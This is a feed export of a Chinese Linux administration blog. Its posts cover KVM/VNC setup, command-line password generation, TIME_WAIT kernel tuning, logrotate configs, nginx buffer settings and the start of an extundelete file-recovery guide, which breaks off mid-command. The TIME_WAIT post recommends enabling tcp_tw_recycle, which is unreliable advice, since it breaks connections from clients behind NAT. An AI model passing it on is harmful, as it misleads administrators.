<h2 id="4-启动服务"><a href="#4-启动服务" class="headerlink" title="4.启动服务"></a>4.启动服务</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/vncserver start</div><div class="line"></div><div class="line">chkconfig vncserver on</div></pre></td></tr></table></figure>
<h2 id="5-配置QEMU"><a href="#5-配置QEMU" class="headerlink" title="5. 配置QEMU"></a>5. 配置QEMU</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">vim /etc/libvirt/qemu.conf</div><div class="line"></div><div class="line">    vnc_listen = <span class="string">"0.0.0.0"</span></div><div class="line"></div><div class="line">    vnc_password = <span class="string">"xxxxx"</span></div></pre></td></tr></table></figure>
<h2 id="6-重启服务"><a href="#6-重启服务" class="headerlink" title="6.重启服务"></a>6.重启服务</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/libvirtd restart</div></pre></td></tr></table></figure>
<h1 id="三-创建虚拟机"><a href="#三-创建虚拟机" class="headerlink" title="三. 创建虚拟机"></a>三. 创建虚拟机</h1><h2 id="1-创建centos虚拟机"><a href="#1-创建centos虚拟机" class="headerlink" title="1. 创建centos虚拟机"></a>1. 创建centos虚拟机</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virt-install --network bridge=br0 --name=test_centos --ram=2048 --vcpus=2 --disk path=/var/lib/libvirt/images/test_centos.img,size=200 --cdrom /usr/<span class="built_in">local</span>/src/CentOS-6.7-x86_64-minimal.iso --vnc --vncport=5910 --hvm</div></pre></td></tr></table></figure>
<p>　　执行上面命令后通过VNC 连接安装系统</p>
<h2 id="2-创建windows虚拟机"><a href="#2-创建windows虚拟机" class="headerlink" title="2.创建windows虚拟机"></a>2.创建windows虚拟机</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virt-install --network bridge=br0 --name=test_xp --ram=2048 --vcpus=2 --disk path=/var/lib/libvirt/images/test_xp.img,size=200 --cdrom /usr/<span class="built_in">local</span>/src/Deepin-LiteXP-5.10.iso --vnc --vncport=5920 --os-type=Windows</div></pre></td></tr></table></figure>
<p>　　执行上面命令后通过VNC 连接安装系统</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一-KVM安装&quot;&gt;&lt;a href=&quot;#一-KVM安装&quot; class=&quot;headerlink&quot; title=&quot;一. KVM安装&quot;&gt;&lt;/a&gt;一. KVM安装&lt;/h1&gt;&lt;h2 id=&quot;1-查看硬件是否支持虚拟化&quot;&gt;&lt;a href=&quot;#1-查看硬件是否支持虚拟化&quot; class=&quot;headerlink&quot; title=&quot;1. 查看硬件是否支持虚拟化&quot;&gt;&lt;/a&gt;1. 查看硬件是否支持虚拟化&lt;/h2&gt;&lt;p&gt;　　KVM需要CPU支持虚拟化，执行以下命令查看是否支持虚拟化：&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;egrep &lt;span class=&quot;string&quot;&gt;&#39;(vmx|svm)&#39;&lt;/span&gt; --color=always /proc/cpuinfo&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;　　如果含有vmx或者svm字样，则表示支持CPU虚拟化，&lt;/p&gt;
&lt;p&gt;　　Intel是vmx，AMD是svm。&lt;/p&gt;
    
    </summary>
    
      <category term="service" scheme="http://www.unix-like.com/categories/service/"/>
    
    
      <category term="kvm" scheme="http://www.unix-like.com/tags/kvm/"/>
    
  </entry>
  
  <entry>
    <title>使用命令行生成高强度密码</title>
    <link href="http://www.unix-like.com/2017/06/02/system/%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%94%9F%E6%88%90%E9%AB%98%E5%BC%BA%E5%BA%A6%E5%AF%86%E7%A0%81/"/>
    <id>http://www.unix-like.com/2017/06/02/system/使用命令行生成高强度密码/</id>
    <published>2017-06-02T01:54:11.000Z</published>
    <updated>2017-06-02T01:55:23.376Z</updated>
    
    <content type="html"><![CDATA[<p>设置一个高强度的密码是非常重要的，这样才能够很好的保护自己的账号或者服务器以及确保自己的数据的安全。通常来说，一个高强度密码至少有 14 个字符，包括大小写字母、数字和特殊字符，并且要牢记永远不用那些字典中的单词。使用长密码比短密码要来的安全，因为密码越长越难猜测。在本文中，我将给你介绍几个不同方法，让你可以在 Linux 命令行下生成一个高强度密码。</p>
<a id="more"></a>
<h1 id="使用-openssl-生成高强度密码"><a href="#使用-openssl-生成高强度密码" class="headerlink" title="使用 openssl 生成高强度密码"></a>使用 openssl 生成高强度密码</h1><p>这里使用 openssl 的 rand 方法，它会生成一个 14 位字符的随机字符：</p>
<pre><code>openssl rand -base64 14
</code></pre><h1 id="使用-urandom-生成高强度密码"><a href="#使用-urandom-生成高强度密码" class="headerlink" title="使用 urandom 生成高强度密码"></a>使用 urandom 生成高强度密码</h1><p>这里我们将使用 tr 条件来过滤 /dev/urandom 的输出，从而删掉那些不想要的字符，并打印出第一个出现的 14 位字符。</p>
<pre><code>&lt; /dev/urandom tr -dc A-Za-z0-9 | head -c14; echo
</code></pre><h1 id="使用-pwgen-生成高强度密码"><a href="#使用-pwgen-生成高强度密码" class="headerlink" title="使用 pwgen 生成高强度密码"></a>使用 pwgen 生成高强度密码</h1><p>pwgen 是一个生成随机、无特殊含义但可以正常拼读的密码。</p>
<p>安装 pwgen，运行：</p>
<pre><code>sudo apt-get install pwgen
</code></pre><p>安装好之后，使用以下命令来生成一个 14 位随机字符：</p>
<pre><code>pwgen 14 1
</code></pre><p>你也可以使用以下标记：</p>
<ul>
<li>-c 或 –capitalize 生成的密码中至少包含一个大写字母</li>
<li>-A 或 –no-capitalize 生成的密码中不含大写字母</li>
<li>-n 或 –numerals 生成的密码中至少包含一个数字</li>
<li>-0 或 –no-numerals 生成的密码中不含数字</li>
<li>-y 或 –symbols 生成的密码中至少包含一个特殊字符</li>
<li>-s 或 –secure 生成一个完全随机的密码</li>
<li>-B 或 –ambiguous 生成的密码中不含易混淆字符</li>
<li>-h 或 –help 输出帮助信息</li>
<li>-H 或 –sha1=path/to/file[#seed] 使用指定文件的 sha1 哈希值作为随机生成器</li>
<li>-C 按列输出生成的密码</li>
<li>-1 不按列输出生成的密码</li>
<li>-v 或 –no-vowels 不使用任何元音，以免意外生成让人讨厌的单词</li>
</ul>
<h1 id="使用-gpg-生成高强度密码"><a href="#使用-gpg-生成高强度密码" class="headerlink" title="使用 gpg 生成高强度密码"></a>使用 gpg 生成高强度密码</h1><p>我们也可以使用 gpg 工具来生成一个 14 位字符的密码：</p>
<pre><code>gpg --gen-random --armor 1 14
</code></pre><h1 id="其它方法"><a href="#其它方法" class="headerlink" title="其它方法"></a>其它方法</h1><p>当然，可能还有很多方法可以生成一个高强度密码。比方说，你可以添加以下 bash shell 方法到 ~/.bashrc 文件：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">genpasswd</span></span>() &#123; </div><div class="line">    strings /dev/urandom | grep -o <span class="string">'[[:alnum:]]'</span> | head -n 14 | tr <span class="_">-d</span> <span class="string">'\n'</span>; <span class="built_in">echo</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当你想要生成一个高强度的随机密码时，运行<code>genpasswd</code>就好了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;设置一个高强度的密码是非常重要的，这样才能够很好的保护自己的账号或者服务器以及确保自己的数据的安全。通常来说，一个高强度密码至少有 14 个字符，包括大小写字母、数字和特殊字符，并且要牢记永远不用那些字典中的单词。使用长密码比短密码要来的安全，因为密码越长越难猜测。在本文中，我将给你介绍几个不同方法，让你可以在 Linux 命令行下生成一个高强度密码。&lt;/p&gt;
    
    </summary>
    
      <category term="system" scheme="http://www.unix-like.com/categories/system/"/>
    
    
      <category term="shell" scheme="http://www.unix-like.com/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>LINUX下解决netstat查看TIME_WAIT状态过多问题</title>
    <link href="http://www.unix-like.com/2017/05/31/system/LINUX%E4%B8%8B%E8%A7%A3%E5%86%B3netstat%E6%9F%A5%E7%9C%8BTIME-WAIT%E7%8A%B6%E6%80%81%E8%BF%87%E5%A4%9A%E9%97%AE%E9%A2%98/"/>
    <id>http://www.unix-like.com/2017/05/31/system/LINUX下解决netstat查看TIME-WAIT状态过多问题/</id>
    <published>2017-05-31T08:03:00.000Z</published>
    <updated>2017-05-31T08:06:25.551Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netstat -an|awk '/tcp/ &#123;print $6&#125;'|sort|uniq -c</span></div><div class="line">     16 CLOSING</div><div class="line">    130 ESTABLISHED</div><div class="line">    298 FIN_WAIT1</div><div class="line">     13 FIN_WAIT2</div><div class="line">      9 LAST_ACK</div><div class="line">      7 LISTEN</div><div class="line">    103 SYN_RECV</div><div class="line">   5204 TIME_WAIT</div><div class="line"></div><div class="line">状态：描述</div><div class="line">CLOSED：无连接是活动的或正在进行</div><div class="line">LISTEN：服务器在等待进入呼叫</div><div class="line">SYN_RECV：一个连接请求已经到达，等待确认</div><div class="line">SYN_SENT：应用已经开始，打开一个连接</div><div class="line">ESTABLISHED：正常数据传输状态</div><div class="line">FIN_WAIT1：应用说它已经完成</div><div class="line">FIN_WAIT2：另一边已同意释放</div><div class="line">ITMED_WAIT：等待所有分组死掉</div><div class="line">CLOSING：两边同时尝试关闭</div><div class="line">TIME_WAIT：另一边已初始化一个释放</div><div class="line">LAST_ACK：等待所有分组死掉</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>如发现系统存在大量TIME_WAIT状态的连接，通过调整内核参数解决，</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/sysctl.conf</div></pre></td></tr></table></figure>
<p>编辑文件，加入以下内容：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">net.ipv4.tcp_syncookies = 1</div><div class="line">net.ipv4.tcp_tw_reuse = 1</div><div class="line">net.ipv4.tcp_tw_recycle = 1</div><div class="line">net.ipv4.tcp_fin_timeout = 30</div></pre></td></tr></table></figure></p>
<p>然后执行 <code>/sbin/sysctl -p</code> 让参数生效。</p>
<p>net.ipv4.tcp_syncookies = 1 表示开启SYN cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭；</p>
<p>net.ipv4.tcp_tw_reuse = 1 表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭；</p>
<p>net.ipv4.tcp_tw_recycle = 1 表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭。</p>
<p>net.ipv4.tcp_fin_timeout 修改系統默认的 TIMEOUT 时间</p>
<p>下面附上TIME_WAIT状态的意义：</p>
<p>客户端与服务器端建立TCP/IP连接后关闭SOCKET后，服务器端连接的端口</p>
<p>状态为TIME_WAIT</p>
<p>是不是所有执行主动关闭的socket都会进入TIME_WAIT状态呢？</p>
<p>有没有什么情况使主动关闭的socket直接进入CLOSED状态呢？</p>
<p>主动关闭的一方在发送最后一个 ack 后就会进入 TIME_WAIT 状态 停留2MSL（max segment lifetime）时间这个是TCP/IP必不可少的，也就是“解决”不了的。</p>
<p>也就是TCP/IP设计者本来是这么设计的</p>
<p>主要有两个原因</p>
<p>1。防止上一次连接中的包，迷路后重新出现，影响新连接（经过2MSL，上一次连接中所有的重复包都会消失）</p>
<p>2。可靠的关闭TCP连接</p>
<p>在主动关闭方发送的最后一个 ack(fin) ，有可能丢失，这时被动方会重新发fin, 如果这时主动方处于 CLOSED 状态 ，就会响应 rst 而不是 ack。所以主动方要处于 TIME_WAIT 状态，而不能是 CLOSED 。</p>
<p>TIME_WAIT 并不会占用很大资源的，除非受到攻击。</p>
<p>还有，如果一方 send 或 recv 超时，就会直接进入 CLOSED 状态</p>
]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# netstat -an|awk &#39;/tcp/ &amp;#123;print $6&amp;#125;&#39;|sort|uniq -c&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     16 CLOSING&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    130 ESTABLISHED&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    298 FIN_WAIT1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     13 FIN_WAIT2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      9 LAST_ACK&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      7 LISTEN&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    103 SYN_RECV&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   5204 TIME_WAIT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;状态：描述&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;CLOSED：无连接是活动的或正在进行&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LISTEN：服务器在等待进入呼叫&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;SYN_RECV：一个连接请求已经到达，等待确认&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;SYN_SENT：应用已经开始，打开一个连接&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ESTABLISHED：正常数据传输状态&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;FIN_WAIT1：应用说它已经完成&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;FIN_WAIT2：另一边已同意释放&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ITMED_WAIT：等待所有分组死掉&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;CLOSING：两边同时尝试关闭&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;TIME_WAIT：另一边已初始化一个释放&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LAST_ACK：等待所有分组死掉&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="system" scheme="http://www.unix-like.com/categories/system/"/>
    
    
      <category term="调优" scheme="http://www.unix-like.com/tags/%E8%B0%83%E4%BC%98/"/>
    
  </entry>
  
  <entry>
    <title>logrotate切割日志nginx和php配置</title>
    <link href="http://www.unix-like.com/2017/05/31/service/logrotate%E5%88%87%E5%89%B2%E6%97%A5%E5%BF%97nginx%E5%92%8Cphp%E9%85%8D%E7%BD%AE/"/>
    <id>http://www.unix-like.com/2017/05/31/service/logrotate切割日志nginx和php配置/</id>
    <published>2017-05-31T03:25:18.000Z</published>
    <updated>2017-05-31T03:27:20.615Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">/gotwo_data/logs/nginx/2mm.cn/*.log &#123;</div><div class="line">        daily</div><div class="line">        missingok</div><div class="line">        rotate 52</div><div class="line">        compress</div><div class="line">        delaycompress</div><div class="line">        notifempty</div><div class="line">        create 644 nginx nginx</div><div class="line">        sharedscripts</div><div class="line">        postrotate</div><div class="line">                [ <span class="_">-f</span> /gotwo_data/logs/nginx/nginx.pid ] &amp;&amp; <span class="built_in">kill</span> -USR1 `cat /gotwo_data/logs/nginx/nginx.pid`</div><div class="line">        endscript</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="php配置"><a href="#php配置" class="headerlink" title="php配置"></a>php配置</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">/gotwo_data/logs/php/*.log &#123;</div><div class="line">        daily</div><div class="line">        missingok</div><div class="line">        rotate 52</div><div class="line">        compress</div><div class="line">        delaycompress</div><div class="line">        notifempty</div><div class="line">        create 666 nobody nobody</div><div class="line">        sharedscripts</div><div class="line">        postrotate</div><div class="line">                [ <span class="_">-f</span> /gotwo_data/Application/php/var/run/php-fpm.pid ] &amp;&amp; <span class="built_in">kill</span> -USR1 `cat /gotwo_data/Application/php/var/run/php-fpm.pid`</div><div class="line">        endscript</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;nginx配置&quot;&gt;&lt;a href=&quot;#nginx配置&quot; class=&quot;headerlink&quot; title=&quot;nginx配置&quot;&gt;&lt;/a&gt;nginx配置&lt;/h1&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;/gotwo_data/logs/nginx/2mm.cn/*.log &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        daily&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        missingok&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        rotate 52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        compress&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        delaycompress&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        notifempty&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        create 644 nginx nginx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        sharedscripts&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        postrotate&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                [ &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; /gotwo_data/logs/nginx/nginx.pid ] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -USR1 `cat /gotwo_data/logs/nginx/nginx.pid`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        endscript&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="service" scheme="http://www.unix-like.com/categories/service/"/>
    
    
      <category term="logrotate" scheme="http://www.unix-like.com/tags/logrotate/"/>
    
  </entry>
  
  <entry>
    <title>nginx常见问题</title>
    <link href="http://www.unix-like.com/2017/05/31/service/nginx%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
    <id>http://www.unix-like.com/2017/05/31/service/nginx常见问题/</id>
    <published>2017-05-31T03:01:53.000Z</published>
    <updated>2017-05-31T03:05:47.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-错误日志：warn：an-upstream-response-is-buffered-to-a-temporary-file"><a href="#1-错误日志：warn：an-upstream-response-is-buffered-to-a-temporary-file" class="headerlink" title="1.错误日志：warn：an upstream response is buffered to a temporary file"></a>1.错误日志：warn：an upstream response is buffered to a temporary file</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">解决办法：增加fastcgi_buffers 8 4K;     fastcgi_buffer_size 4K;</div></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="2-a-client-request-body-is-buffered-to-a-temporary-file"><a href="#2-a-client-request-body-is-buffered-to-a-temporary-file" class="headerlink" title="2. a client request body is buffered to a temporary file"></a>2. a client request body is buffered to a temporary file</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">解决办法：增加client_max_body_size 2050m;     client_body_buffer_size 1024k;</div></pre></td></tr></table></figure>
<h2 id="Nginx-的-buffer-机制："><a href="#Nginx-的-buffer-机制：" class="headerlink" title="Nginx 的 buffer 机制："></a>Nginx 的 buffer 机制：</h2><p>对于来自 FastCGI Server 的 Response，Nginx 将其缓冲到内存中，然后依次发送到客户端浏览器。缓冲区的大小由 fastcgi_buffers 和 fastcgi_buffer_size 两个值控制。</p>
<p>比如如下配置：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fastcgi_buffers      8 4K;</div><div class="line">fastcgi_buffer_size  4K;</div></pre></td></tr></table></figure>
<p>fastcgi_buffers 控制 nginx 最多创建 8 个大小为 4K 的缓冲区，而 fastcgi_buffer_size 则是处理 Response 时第一个缓冲区的大小，不包含在前者中。所以总计能创建的最大内存缓冲区大小是 8<em>4K+4K = 36k。而这些缓冲区是根据实际的 Response 大小动态生成的，并不是一次性创建的。比如一个 8K 的页面，Nginx 会创建 2</em>4K 共 2 个 buffers。</p>
<p>当 Response 小于等于 36k 时，所有数据当然全部在内存中处理。如果 Response 大于 36k 呢？fastcgi_temp 的作用就在于此。多出来的数据会被临时写入到文件中，放在这个目录下面。同时你会在 error.log 中看到一条类似 warning：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">2010/03/13 03:42:22 [warn] 3994#0: *1 an upstream response is buffered to a temporary file</div><div class="line">/usr/local/nginx/fastcgi_temp/1/00/0000000001 while reading upstream, </div><div class="line">client: 192.168.1.111,</div><div class="line">server: www.xxx.cn,</div><div class="line">request: &quot;POST /test.php HTTP/1.1&quot;,</div><div class="line">upstream: &quot;fastcgi://127.0.0.1:9000&quot;, </div><div class="line">host: &quot;xxx.cn&quot;,</div><div class="line">referrer: &quot;http://xxx.cn/test.php&quot;</div></pre></td></tr></table></figure>
<p>显然，缓冲区设置的太小的话，Nginx 会频繁读写硬盘，对性能有很大的影响，但也不是越大越好，没意义. </p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-错误日志：warn：an-upstream-response-is-buffered-to-a-temporary-file&quot;&gt;&lt;a href=&quot;#1-错误日志：warn：an-upstream-response-is-buffered-to-a-temporary-file&quot; class=&quot;headerlink&quot; title=&quot;1.错误日志：warn：an upstream response is buffered to a temporary file&quot;&gt;&lt;/a&gt;1.错误日志：warn：an upstream response is buffered to a temporary file&lt;/h1&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;解决办法：增加fastcgi_buffers 8 4K;     fastcgi_buffer_size 4K;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="service" scheme="http://www.unix-like.com/categories/service/"/>
    
    
      <category term="nginx" scheme="http://www.unix-like.com/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>恢复linux被误删文件</title>
    <link href="http://www.unix-like.com/2017/05/30/system/%E6%81%A2%E5%A4%8Dlinux%E8%A2%AB%E8%AF%AF%E5%88%A0%E6%96%87%E4%BB%B6/"/>
    <id>http://www.unix-like.com/2017/05/30/system/恢复linux被误删文件/</id>
    <published>2017-05-30T10:31:56.000Z</published>
    <updated>2017-05-30T10:34:19.698Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、首先我们先来了解下文件删除原理："><a href="#一、首先我们先来了解下文件删除原理：" class="headerlink" title="一、首先我们先来了解下文件删除原理："></a>一、首先我们先来了解下文件删除原理：</h1><ul>
<li>1）linux是通过link的数量来控制文件删除的，只有当一个文件不存在任何link的时候，这个文件才会被删除。一般来说，每个文件都有2个link计数器：i_count和i_nlink。</li>
<li>2）当进程打开了某个文件时，只要该进程保持打开该文件，即使将其删除，它依然存在于磁盘中。这意味着，进程并不知道文件已经被删除，它仍然可以向打开该文件时提供给它的文件描述符进行读取和写入。除了该进程之外，这个文件是不可见的，因为已经删除了其相应的目录索引节点。</li>
<li>3）当你发现你误删除了文件后，要做的第一件事是马上卸载被误删除文件所在的分区，或者以只读的方式来挂载该分区。原因大家都很清楚，文件被删除后，文件中的数据还存在磁盘上，除非存放这些数据的数据块又被操作系统分配出去了。我们这一步就是尽量降低数据块中数据被覆盖的风险，以提高恢复数据成功的比率。</li>
</ul>
<a id="more"></a>
<h1 id="二、了解完后，实战演练"><a href="#二、了解完后，实战演练" class="headerlink" title="二、了解完后，实战演练"></a>二、了解完后，实战演练</h1><hr>
<h2 id="方案-1）现在我向大家介绍使用extundelete恢复文件（适合rhel6-X系统的ext4"><a href="#方案-1）现在我向大家介绍使用extundelete恢复文件（适合rhel6-X系统的ext4" class="headerlink" title="方案 1）现在我向大家介绍使用extundelete恢复文件（适合rhel6.X系统的ext4)"></a>方案 1）现在我向大家介绍使用extundelete恢复文件（适合rhel6.X系统的ext4)</h2><h3 id="1-编译安装extundelete-0-2-4"><a href="#1-编译安装extundelete-0-2-4" class="headerlink" title="1.编译安装extundelete-0.2.4"></a>1.编译安装extundelete-0.2.4</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">tar -jxvf  extundelete-0.2.4.tar.bz2</div><div class="line"><span class="built_in">cd</span> extundelete-0.2.4</div><div class="line">./configure （这步出现错误，请看下文）</div><div class="line">mount /dev/cdrom /mnt</div><div class="line">rpm -ivh  /mnt/Packages/e2fsprogs-devel-1.41.12-18.el6.x86_64.rpm  